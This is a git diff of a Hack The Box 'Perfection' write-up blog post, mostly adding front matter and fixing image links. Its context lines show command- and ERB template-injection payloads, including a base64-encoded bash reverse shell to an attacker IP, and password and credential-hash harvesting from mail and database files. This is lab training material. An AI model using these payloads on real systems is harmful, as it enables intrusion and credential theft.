@@ -1,8 +1,16 @@
 
+---
+title: Hack The Box - Perfection
+date: 2024-12-05 13:33:37 +0200
+categories:
+  - HackTheBox
+tags:
+  - HTB
+comments: true
+---
 
 HTB Perfection Machine - https://www.hackthebox.com/machines/perfection
 
-### 05/06/2024
 
 ### Scanning & Enumeration
 As always, one of the first things we need to do is understand what services the target is hosting. We can do that with the nmap tool
@@ -34,7 +42,7 @@ It looks like the only interactive page we have is on /weighted-grade so lets go
 ### Exploitation & Gaining Access 
 When we navigate to the web page we see a table that takes user input. Assuming the "Grade" and "Weight" columns only take integers, I filled out the table with junk data to see how the page handles the input.
 
-![[Pasted image 20250817010606.png]]
+![](/assets/img/posts/Pasted image 20250817010606.png)
 
 After submitting that junk information, all we will see is a message saying: "Please reenter! Weights do not add up to 100." So lets see if we can get it to return something else using command injection.
 
@@ -43,20 +51,20 @@ In the category section
 asdf;echo "Cat 1!"
 ```
 
-![[Pasted image 20250817010614.png]]
+![](/assets/img/posts/Pasted image 20250817010614.png)
 
 The results will be:
 
-![[Pasted image 20250817010624.png]]
+![](/assets/img/posts/Pasted image 20250817010624.png)
 
  
 
 So it looks like the website is checking the sum of the weights before anything else. Lets make one of the weights equal to 100 and see what happens.
-![[Pasted image 20250817010639.png]]
+![](/assets/img/posts/Pasted image 20250817010639.png)
 
 The results will be:
 
-![[Pasted image 20250817010650.png]]
+![](/assets/img/posts/Pasted image 20250817010650.png)
 
 We've now confirmed that the site is checking the total weight value before evaluating any other input. The next few tests I tried the following:
 ```
@@ -78,14 +86,14 @@ That payload worked with me
 category1=a%0A<%25%3Dsystem("ping+-c1+$myIP");%25>
 ```
 
-![[Pasted image 20250817010802.png]]
+![](/assets/img/posts/Pasted image 20250817010802.png)
 
 ICMP echo from the target box.
 ```
 Sudo tcpdump -i tune0 -A icmp
 ```
 
-![[Pasted image 20250817010812.png]]
+![](/assets/img/posts/Pasted image 20250817010812.png)
 
 Reverse shell
 ```
@@ -112,7 +120,7 @@ Second, the final post parameters which will send with BurpSuite
 grade1=1&weight1=100&category2=N%2FA&grade2=1&weight2=0&category3=N%2FA&grade3=1&weight3=0&category4=N%2FA&grade4=1&weight4=0&category5=N%2FA&grade5=1&weight5=0&category1=a%0A<%25%3dsystem("echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi40MC8xMjM0IDA%2BJjEK|+base64+-d+|+bash");%25>
 ```
 
-![[Pasted image 20250817010855.png]]
+![](/assets/img/posts/Pasted image 20250817010855.png)
 
 Note:
 - The sed command is used to remove `+` from the base64 string to prevent BurpSuite from thinking, it is a space.
@@ -150,7 +158,7 @@ To display it
 cat /var/mail/susan
 ```
 
-![[Pasted image 20250817011054.png]]
+![](/assets/img/posts/Pasted image 20250817011054.png)
 
 We found an email, it contains information about how passwords are formatted.
 
@@ -159,7 +167,7 @@ Files with the word password in the home directory
 grep -i password -R .
 ```
 
-![[Pasted image 20250817011113.png]]
+![](/assets/img/posts/Pasted image 20250817011113.png)
 
 ```
 strings Migration/pupilpath_credentials.db | grep -i "susan"      # Susan Millerabeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
